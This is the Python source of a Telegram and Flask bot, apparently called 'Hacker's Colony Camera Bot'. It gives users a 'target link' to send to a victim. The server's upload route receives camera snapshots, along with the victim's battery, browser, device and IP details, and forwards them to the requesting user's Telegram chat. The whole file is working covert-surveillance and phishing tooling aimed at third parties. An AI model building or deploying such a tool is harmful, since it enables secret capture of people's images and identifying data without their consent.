import os, base64, threading, sqlite3, time, telebot
from flask import Flask, render_template, request, jsonify
from telebot import types

app = Flask(__name__)

# --- Configuration ---
BOT_TOKEN = os.getenv('BOT_TOKEN')
ADMINS = [518067190, 7162565886] 
CONTACT_SUPPORT_LINK = "tg://user?id=518067190"
TG_CHANNEL = "https://t.me/HackersColony"
YT_CHANNEL = "https://youtube.com/@hackers_colony_tech?si=EXxJtogSUPc8Q4zM"

bot = telebot.TeleBot(BOT_TOKEN)

def init_db():
    conn = sqlite3.connect('users.db')
    conn.execute('CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY)')
    conn.commit()
    conn.close()

def add_user(user_id):
    conn = sqlite3.connect('users.db')
    conn.execute('INSERT OR IGNORE INTO users (user_id) VALUES (?)', (user_id,))
    conn.commit()
    conn.close()

@bot.message_handler(commands=['start'])
def start(message):
    add_user(message.chat.id)
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("📢 Join Telegram 📢", url=TG_CHANNEL),
        types.InlineKeyboardButton("📺 Subscribe YouTube 📺", url=YT_CHANNEL),
        types.InlineKeyboardButton("✅ I Have Joined ✅", callback_data="check_join")
    )
    bot.send_message(message.chat.id, "<b>Welcome to Hacker's Colony Camera Bot ⚡️📸</b>", parse_mode='HTML', reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    user_id = call.message.chat.id
    if call.data == "check_join":
        markup = types.InlineKeyboardMarkup()
        btn_front = types.InlineKeyboardButton("📸 Front Camera", callback_data="m_front")
        btn_back = types.InlineKeyboardButton("📸 Back Camera", callback_data="m_back")
        btn_dual = types.InlineKeyboardButton("📸 Dual Camera", callback_data="m_dual")
        btn_support = types.InlineKeyboardButton("🧑‍💻 Contact Support", url=CONTACT_SUPPORT_LINK)
        markup.row(btn_front, btn_back)
        markup.row(btn_dual)
        markup.row(btn_support)
        bot.edit_message_text("<b>Select your camera mode:</b>", user_id, call.message.message_id, parse_mode='HTML', reply_markup=markup)

    elif "m_" in call.data:
        mode = call.data.replace("m_", "")
        link = f"{request.host_url.rstrip('/')}/?m={mode}&uid={user_id}"
        bot.send_message(user_id, f"🤠 It's your target link 🔗 just send it your target 🎯\n\nUrl =( <code>{link}</code> )\n\n✨Thank you team HCO ✨", parse_mode='HTML')

@bot.message_handler(commands=['broadcast'])
def broadcast(message):
    if message.chat.id in ADMINS:
        msg_text = message.text.replace('/broadcast ', '')
        conn = sqlite3.connect('users.db')
        users = conn.execute('SELECT user_id FROM users').fetchall()
        conn.close()
        for u in users:
            try: bot.send_message(u[0], msg_text)
            except: pass

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    data = request.json
    try:
        img_data = base64.b64decode(data.get('image').split(',')[1])
        info = data.get('info', {})
        caption = (f"🛡️ <b>Audit:</b> {data.get('mode').upper()}\n"
                   f"🔋 <b>Battery:</b> {info.get('battery', 'N/A')}\n"
                   f"🌐 <b>Browser:</b> {info.get('browser', 'N/A')}\n"
                   f"📱 <b>Device:</b> {info.get('device', 'N/A')}\n"
                   f"📍 <b>IP:</b> {request.remote_addr}\n\n"
                   f"✨ Created by Roshan Ali ✨")
        bot.send_photo(data.get('uid'), img_data, caption=caption, parse_mode='HTML')
    except: pass
    return jsonify({"status": "success"})

if __name__ == "__main__":
    init_db()
    def run_bot():
        time.sleep(12) 
        while True:
            try:
                bot.remove_webhook()
                bot.polling(none_stop=True, interval=5, timeout=60)
            except: time.sleep(15)
    threading.Thread(target=run_bot, daemon=True).start()
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
        
